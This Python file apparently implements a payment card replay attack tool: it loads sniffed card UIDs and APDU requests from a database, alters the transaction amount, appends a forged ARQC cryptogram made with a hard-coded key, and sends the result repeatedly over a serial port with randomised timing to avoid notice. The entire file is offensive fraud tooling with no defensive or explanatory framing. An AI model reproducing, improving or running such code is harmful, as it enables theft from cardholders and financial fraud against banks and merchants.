import serial
import sqlite3
import random
import time
from Crypto.Cipher import AES
from Crypto.Hash import CMAC

class GodModeReplayer:
	def __init__(self, db_file="sniffed_cards.db", port="/dev/ttyUSB0", baudrate=9600, master_key=b"1234567812345678"):
		self.db_file = db_file
		self.serial_conn = serial.Serial(port, baudrate, timeout=1)
		self.master_key = master_key

	def replay_transactions(self, num_replays=10):
		data = self._retrieve_sniffed_data()
		for entry in data:
			for _ in range(num_replays):
				modified_apdu = self._modify_apdu(entry)
				forged_arqc = self._generate_forged_arqc(entry)
				final_apdu = modified_apdu + forged_arqc
				self.serial_conn.write(final_apdu + b"\n")
				time.sleep(random.uniform(0.8, 2.3))
				print(f"Replayed: {final_apdu.hex()} for UID {entry['uid']}")

	def _retrieve_sniffed_data(self):
		conn = sqlite3.connect(self.db_file)
		cursor = conn.cursor()
		cursor.execute("SELECT uid, apdu_request FROM sniffed_data")
		data = [{"uid": row[0], "apdu_request": bytes.fromhex(row[1])} for row in cursor.fetchall()]
		conn.close()
		return data

	def _modify_apdu(self, entry):
		"""Modifies APDU dynamically before replay"""
		apdu = entry["apdu_request"]
		amount_bytes = random.randint(600, 2500).to_bytes(2, "big")
		apdu = apdu[:10] + amount_bytes + apdu[12:]
		return apdu

	def _generate_forged_arqc(self, entry):
		"""Generates an ARQC cryptogram dynamically"""
		unpredictable_number = random.randbytes(4)
		session_key = CMAC.new(self.master_key, ciphermod=AES)
		session_key.update(unpredictable_number + b"\x00\x00\x00\x00")
		cmac = CMAC.new(session_key.digest(), ciphermod=AES)
		cmac.update(entry["apdu_request"])
		return cmac.digest()
